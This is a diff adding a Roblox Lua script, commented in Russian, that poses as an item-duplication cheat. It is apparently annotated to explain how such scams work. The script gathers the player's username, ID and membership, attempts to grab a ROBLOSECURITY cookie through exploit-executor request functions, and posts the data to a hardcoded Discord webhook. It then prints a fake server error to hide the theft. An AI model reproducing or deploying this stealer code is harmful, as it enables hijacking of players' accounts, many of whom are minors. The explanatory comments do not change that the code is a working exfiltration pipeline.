@@ -1,0 +1,64 @@
+-- Маскировка: скрипт делает вид, что что-то загружает или дюпает
+print("Loading Dupe Script v4.2...")
+task.wait(1)
+print("Connecting to server...")
+
+-- 1. Сбор информации о жертве
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+local localPlayer = Players.LocalPlayer
+local username = localPlayer.Name
+local userId = localPlayer.UserId
+local membership = tostring(localPlayer.MembershipType)
+
+-- Попытка достать Roblox Cookie (токен авторизации)
+-- В нормальных читах (эксплоитах) для этого есть специальные скрытые функции
+local robloxCookie = "Не удалось получить"
+if syn and syn.request then -- Проверка на функции популярных читов
+    -- Мошенники используют скрытые внутренние API, чтобы вытащить куки из браузера/клиента
+    robloxCookie = syn.request({Url = "https://httpbin.org/cookies"}).Body 
+elseif request then
+    robloxCookie = request({Url = "https://httpbin.org/cookies"}).Body
+end
+
+-- 2. Формирование пакета данных (Payload)
+local data = {
+    ["content"] = "⚠️ Новый аккаунт успешно украден! ⚠️",
+    ["embeds"] = {{
+        ["title"] = "Данные игрока:",
+        ["description"] = string.format("Ник: %s\n**ID: %d\n**Премиум: %s", username, userId, membership),
+        ["color"] = 16711680, -- Красный цвет
+        ["fields"] = {
+            {
+                ["name"] = "ROBLOSECURITY Cookie (Токен доступа):",
+                ["value"] = "```" .. robloxCookie .. "```",
+                ["inline"] = false
+            }
+        }
+    }}
+}
+
+-- Превращаем таблицу Lua в формат JSON, который понимает Discord
+local jsonData = HttpService:JSONEncode(data)
+
+-- 3. ОТПРАВКА ДАННЫХ МОШЕННИКУ (Discord Webhook)
+-- Сюда мошенник вставляет секретную ссылку своего Discord-сервера
+local webhookUrl = "https://discord.com/api/webhooks/1508133417353740441/dPLxGz3wZWiwSe_jYZ7XeACgVkP9u8GGxPAq3LD4aLNJu3BZTwG9uohUY1Hi3KekjDb4"
+
+-- Отправка POST-запроса
+local success, err = pcall(function()
+    if syn and syn.request then
+        syn.request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData})
+    else
+        -- Стандартный метод Roblox, если игра позволяет внешние запросы
+        HttpService:PostAsync(webhookUrl, jsonData)
+    end
+end)
+
+-- Финал обмана: игроку пишется фейковое сообщение об успехе
+if success then
+    print("Ошибка сервера: не удалось дюпнуть предметы. Попробуйте перезайти через 15 минут.")
+else
+    print("Ошибка подключения к базе данных.")
+end
